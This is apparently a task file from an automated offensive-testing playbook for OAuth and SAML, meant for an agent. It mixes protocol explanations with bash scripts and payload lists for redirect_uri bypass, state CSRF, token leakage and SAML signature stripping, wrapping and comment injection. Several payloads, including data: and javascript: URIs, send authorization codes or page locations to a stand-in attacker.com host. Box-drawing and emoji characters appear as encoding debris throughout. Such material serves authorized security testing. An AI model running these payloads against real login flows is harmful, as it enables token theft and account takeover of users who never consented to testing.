================================================================================
TASK 62 Â· OAUTH & SSO EXPLOITATION SUITE
================================================================================
Covers testing_toolkit.txt Phase 7 Step 23
High-impact account takeover via OAuth/SSO misconfigurations.

OBJECTIVE:
- Exploit redirect_uri bypass for token theft
- Abuse state parameter vulnerabilities (CSRF, fixation)
- Leak tokens via Referer, open redirects, and postMessage
- Bypass SAML signature verification
- Chain OAuth flaws with XSS/Open Redirect for account takeover

================================================================================
INPUTS
================================================================================
outputs/har/accounts/*_auth.json          â† OAuth tokens from HAR (per-account)
outputs/har/common_data.txt               â† Auth endpoints from HAR
outputs/live_base_urls.txt                â† Target hosts
temp/agent1/js_files.txt                  â† JS files (client_id, secrets)

OPTIONAL (for chaining - extract from nuclei findings if available):
  jq -r 'select(.info.tags | index("open-redirect")) | .host' outputs/nuclei/*.json > temp/agent1/open_redirects.txt

================================================================================
OUTPUTS
================================================================================
outputs/oauth_sso_attacks/
â”œâ”€â”€ oauth_endpoints.txt            â† Discovered OAuth/SSO endpoints
â”œâ”€â”€ redirect_uri_bypass.txt        â† Successful redirect_uri bypasses
â”œâ”€â”€ state_vulnerabilities.txt      â† State param issues (missing/weak)
â”œâ”€â”€ token_leakage.txt              â† Token exposure vectors
â”œâ”€â”€ saml_bypass.txt                â† SAML signature bypass results
â”œâ”€â”€ account_takeover_chains.txt    â† Complete ATO attack chains
â””â”€â”€ scan_log.txt                   â† Full execution log

================================================================================
ğŸ§  OAUTH 2.0 FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
OAuth 2.0 Grant Types
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. AUTHORIZATION CODE (Most Common - Web Apps)
   User â†’ App â†’ Auth Server â†’ Code â†’ App â†’ Token
   
2. IMPLICIT (Legacy - SPAs) âš ï¸ DEPRECATED
   User â†’ App â†’ Auth Server â†’ Token directly in URL
   
3. CLIENT CREDENTIALS (Server-to-Server)
   App â†’ Auth Server â†’ Token (no user involved)
   
4. RESOURCE OWNER PASSWORD (Legacy) âš ï¸ AVOID
   User gives password to App â†’ App â†’ Token

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Authorization Code Flow (Attack Surface)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Authorization Request                                               â”‚
â”‚ GET /authorize?                                                             â”‚
â”‚   response_type=code                                                        â”‚
â”‚   &client_id=APP_ID                                                         â”‚
â”‚   &redirect_uri=https://app.com/callback  â† ğŸ¯ ATTACK TARGET               â”‚
â”‚   &scope=openid profile email                                               â”‚
â”‚   &state=RANDOM_VALUE                      â† ğŸ¯ ATTACK TARGET               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ STEP 2: User Authenticates + Consents                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ STEP 3: Authorization Response                                              â”‚
â”‚ 302 Redirect to: https://app.com/callback?code=AUTH_CODE&state=VALUE        â”‚
â”‚                                            â†‘ ğŸ¯ CODE THEFT TARGET           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ STEP 4: Token Exchange (Backend)                                            â”‚
â”‚ POST /token                                                                 â”‚
â”‚   grant_type=authorization_code                                             â”‚
â”‚   &code=AUTH_CODE                                                           â”‚
â”‚   &redirect_uri=https://app.com/callback                                    â”‚
â”‚   &client_id=APP_ID                                                         â”‚
â”‚   &client_secret=SECRET                    â† ğŸ¯ SECRET LEAKAGE TARGET       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
PHASE 1: OAUTH ENDPOINT DISCOVERY
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Common OAuth Endpoints
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Authorization endpoints
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/oauth/authorize
/oauth2/authorize
/authorize
/auth
/login/oauth/authorize
/oauth/v2/authorize

# Token endpoints
/oauth/token
/oauth2/token
/token
/oauth/access_token

# SAML endpoints
/saml/sso
/saml2/sso
/sso/saml
/auth/saml
/saml/login
/saml/acs
/saml/metadata

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Discovery Script
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# discover_oauth_endpoints.sh

TARGET="$1"
OUTPUT="outputs/oauth_sso_attacks/oauth_endpoints.txt"

echo "[*] Discovering OAuth/SSO endpoints for $TARGET"

# OpenID Configuration (goldmine of info)
curl -s "$TARGET/.well-known/openid-configuration" | jq . > openid_config.json

# Extract endpoints from config
cat openid_config.json | jq -r '.authorization_endpoint, .token_endpoint, .userinfo_endpoint, .jwks_uri' 2>/dev/null

# Brute force common paths
PATHS=(
    "/.well-known/openid-configuration"
    "/.well-known/oauth-authorization-server"
    "/oauth/authorize"
    "/oauth2/authorize"
    "/authorize"
    "/login"
    "/auth"
    "/saml/sso"
    "/saml2/sso"
    "/sso"
)

for path in "${PATHS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
    if [[ "$status" != "404" ]]; then
        echo "$TARGET$path - $status" >> "$OUTPUT"
    fi
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Extract OAuth Config from JavaScript
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Look for client_id, client_secret, redirect_uri in JS
grep -rP '(client_id|clientId|client_secret|clientSecret|redirect_uri|redirectUri)' temp/agent1/js_files.txt

# Common patterns
grep -oP '"client_id":\s*"[^"]+"' js_responses/
grep -oP 'clientId:\s*["\047][^"\047]+["\047]' js_responses/

================================================================================
PHASE 2: REDIRECT_URI BYPASS ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Understanding redirect_uri Validation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# WEAK VALIDATION PATTERNS (Exploitable):
# - Exact match only on domain, not path
# - Subdomain wildcard (*.app.com)
# - Path prefix match (/callback*)
# - No validation at all
# - Regex with bypass potential

# STRONG VALIDATION (Hard to bypass):
# - Exact match on full URL
# - Pre-registered URLs only

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Basic Bypass Techniques
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Original: redirect_uri=https://app.com/callback

# PATH TRAVERSAL
redirect_uri=https://app.com/callback/../../../attacker.com
redirect_uri=https://app.com/callback/..%2f..%2f..%2fattacker.com
redirect_uri=https://app.com/callback%2f..%2f..%2f

# PATH MANIPULATION
redirect_uri=https://app.com/callback?next=https://attacker.com
redirect_uri=https://app.com/callback#https://attacker.com
redirect_uri=https://app.com/callback/.attacker.com
redirect_uri=https://app.com/callback@attacker.com

# SUBDOMAIN TRICKS (if *.app.com allowed)
redirect_uri=https://attacker.app.com/callback
redirect_uri=https://attacker.com.app.com/callback
redirect_uri=https://app.com.attacker.com/callback

# CASE MANIPULATION
redirect_uri=https://APP.COM/callback
redirect_uri=https://App.Com/callback

# URL ENCODING
redirect_uri=https://app.com%2fcallback
redirect_uri=https://app.com%252fcallback
redirect_uri=https%3a%2f%2fapp.com%2fcallback

# LOCALHOST/INTERNAL
redirect_uri=http://localhost/callback
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Advanced Bypass Techniques
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# FRAGMENT INJECTION (token in fragment, not query)
redirect_uri=https://app.com/callback#

# PARAMETER POLLUTION
redirect_uri=https://app.com/callback&redirect_uri=https://attacker.com
redirect_uri=https://attacker.com&redirect_uri=https://app.com/callback

# NULL BYTE
redirect_uri=https://app.com/callback%00.attacker.com
redirect_uri=https://app.com/callback%00@attacker.com

# UNICODE NORMALIZATION
redirect_uri=https://app.com/callbackï¼..ï¼attacker.com  (fullwidth slash)
redirect_uri=https://â“â“Ÿâ“Ÿ.com/callback  (circled letters)

# IPv6 TRICKS
redirect_uri=https://[::ffff:attacker.com]/callback

# DATA URI (rare but possible)
redirect_uri=data:text/html,<script>location='https://attacker.com?'+document.location</script>

# JAVASCRIPT URI (very rare)
redirect_uri=javascript:location='https://attacker.com?'+document.location

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 Open Redirect Chaining
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If app.com has an open redirect at /redirect?url=
# Chain it with OAuth:

redirect_uri=https://app.com/redirect?url=https://attacker.com

# OAuth flow:
# 1. User authorizes
# 2. Redirected to: https://app.com/redirect?url=https://attacker.com?code=AUTH_CODE
# 3. Open redirect sends user to: https://attacker.com?code=AUTH_CODE
# 4. Attacker captures code!

# USE CONFIRMED OPEN REDIRECTS FROM NUCLEI (if available):
# jq -r 'select(.info.tags | index("open-redirect")) | .host' outputs/nuclei/*.json
# Or check temp/agent1/open_redirects.txt if extracted during INPUT prep

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.5 Automated redirect_uri Testing
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# test_redirect_uri.sh

AUTH_URL="$1"  # https://auth.target.com/oauth/authorize
CLIENT_ID="$2"
LEGIT_REDIRECT="$3"  # https://app.target.com/callback
ATTACKER="$4"  # https://attacker.com

# Generate bypass payloads
PAYLOADS=(
    "$LEGIT_REDIRECT/../../../$ATTACKER"
    "$LEGIT_REDIRECT%2f..%2f..%2f$ATTACKER"
    "$LEGIT_REDIRECT?next=$ATTACKER"
    "$LEGIT_REDIRECT#$ATTACKER"
    "$LEGIT_REDIRECT@$ATTACKER"
    "https://$ATTACKER.$LEGIT_REDIRECT"
    "${LEGIT_REDIRECT/https/http}"
    "$ATTACKER"
    "http://localhost/callback"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    
    # Build auth URL
    url="${AUTH_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${payload}&scope=openid"
    
    # Check response (look for redirect to our payload)
    response=$(curl -s -I "$url" | grep -i "location:")
    echo "    Response: $response"
    
    # If location contains attacker domain â†’ VULNERABLE
    if echo "$response" | grep -qi "$ATTACKER"; then
        echo "    [!] VULNERABLE: redirect_uri bypass!"
    fi
done

================================================================================
PHASE 3: STATE PARAMETER ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Missing State Parameter (CSRF)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Login CSRF - Force victim to log into attacker's account

# STEP 1: Attacker initiates OAuth flow, gets auth code
# STEP 2: Attacker creates link:
#   https://app.com/callback?code=ATTACKER_AUTH_CODE
# STEP 3: Victim clicks link
# STEP 4: Victim is now logged in as attacker!
# STEP 5: Victim enters sensitive data into "their" account
# STEP 6: Attacker accesses account, steals victim's data

# TEST: Remove state parameter from auth request
# If callback still works â†’ VULNERABLE to OAuth CSRF

curl -s "$AUTH_URL?response_type=code&client_id=xxx&redirect_uri=https://app.com/callback&scope=openid"
# Note: No state parameter

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Weak State Parameter
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Predictable state values:
state=1
state=123456
state=user123
state=session_id_here

# If state is predictable â†’ can be guessed/brute-forced

# TEST: Observe multiple state values
# If pattern is predictable â†’ VULNERABLE

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 State Fixation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Set victim's state to known value

# STEP 1: Attacker creates auth URL with known state:
#   https://auth.target.com/oauth/authorize?...&state=KNOWN_VALUE
# STEP 2: Victim clicks link, authenticates
# STEP 3: Callback: https://app.com/callback?code=xxx&state=KNOWN_VALUE
# STEP 4: If app doesn't validate state properly â†’ attacker can hijack

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.4 State Reuse Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# TEST: Use same state value multiple times
# If accepted â†’ state not properly invalidated after use

================================================================================
PHASE 4: TOKEN LEAKAGE VECTORS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 Referer Header Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# SCENARIO: After OAuth callback, page has external links
# Token in URL â†’ sent in Referer header to external sites

# Implicit flow callback:
https://app.com/callback#access_token=SECRET_TOKEN

# User clicks external link on callback page
# Referer header sent: https://app.com/callback#access_token=SECRET_TOKEN
# External site captures token!

# TEST: Check callback page for external resources/links

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 Browser History Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tokens in URL are stored in browser history
# Shared computer â†’ next user sees token in history

# Authorization code flow (less severe - code is short-lived)
# Implicit flow (severe - access_token directly exposed)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 Access Token in URL (Implicit Flow)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# VULNERABLE PATTERN:
https://app.com/callback#access_token=xxx&token_type=bearer

# Token in fragment (#) = client-side only
# But still exposed to:
# - Browser history
# - Browser extensions
# - JavaScript on page
# - postMessage to other windows

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 postMessage Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# SCENARIO: OAuth popup posts token to parent window
# If postMessage targetOrigin is "*" â†’ any page can receive!

# VULNERABLE CODE:
window.opener.postMessage(token, "*");  // BAD!

# SAFE CODE:
window.opener.postMessage(token, "https://app.com");  // GOOD

# TEST: Look for postMessage in JS files
grep -rP 'postMessage\s*\(' js_responses/ | grep -v 'targetOrigin'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.5 Token in Error Messages
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Sometimes tokens leak in error responses
# Check error pages for token reflection

curl -s "https://app.com/api/user" -H "Authorization: Bearer INVALID" | grep -i token

================================================================================
PHASE 5: SAML ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 SAML Flow Overview
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. User â†’ SP (Service Provider)                                             â”‚
â”‚ 2. SP â†’ SAML AuthnRequest â†’ IdP (Identity Provider)                         â”‚
â”‚ 3. User authenticates at IdP                                                â”‚
â”‚ 4. IdP â†’ SAML Response (signed) â†’ SP                                        â”‚
â”‚ 5. SP validates signature â†’ User logged in                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ATTACK TARGETS:
- Signature validation bypass
- XML injection in SAML attributes
- Assertion replay
- Destination/Audience bypass

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Signature Stripping
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Remove signature entirely
# Some SPs accept unsigned assertions!

# STEP 1: Intercept SAML Response
# STEP 2: Remove <Signature> element
# STEP 3: Forward modified response
# STEP 4: If accepted â†’ CRITICAL vulnerability

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Signature Wrapping (XSW)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Move signature to validate different element
# SP validates signature on one element, uses data from another

# XSW1: Move legitimate Assertion, add evil Assertion
# XSW2: Wrap evil Assertion around signed one
# XSW3-XSW8: Various wrapping techniques

# Tools for testing:
# - SAML Raider (Burp extension - but we're CLI only)
# - saml2aws
# - Custom XML manipulation

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.4 XML Signature Exclusion
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Exploit canonicalization/transform exclusions
# Some transforms exclude parts of XML from signature

# If NameID is excluded from signature:
# â†’ Change NameID to admin@target.com
# â†’ Signature still valid!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.5 Comment Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Inject XML comments to bypass validation

# Original NameID:
<NameID>user@target.com</NameID>

# Injected:
<NameID>admin@target.com<!---->.user@target.com</NameID>

# Some parsers read: admin@target.com
# Signature validates: admin@target.com<!---->.user@target.com

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.6 SAML Response Replay
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Capture and replay valid SAML Response
# If no replay protection â†’ reuse indefinitely

# Check for:
# - InResponseTo validation
# - NotOnOrAfter expiration
# - One-time assertion use

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.7 Destination/Audience Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Use SAML Response from one SP on another

# If Destination/Audience not validated:
# â†’ Capture response for app1.com
# â†’ Replay on app2.com
# â†’ Logged in as same user on different app!

================================================================================
PHASE 6: ADVANCED OAUTH ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 PKCE Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# PKCE (Proof Key for Code Exchange) prevents code interception
# If PKCE is optional â†’ bypass by omitting it

# VULNERABLE: Server accepts requests without code_verifier
# TEST: Remove code_challenge from auth request
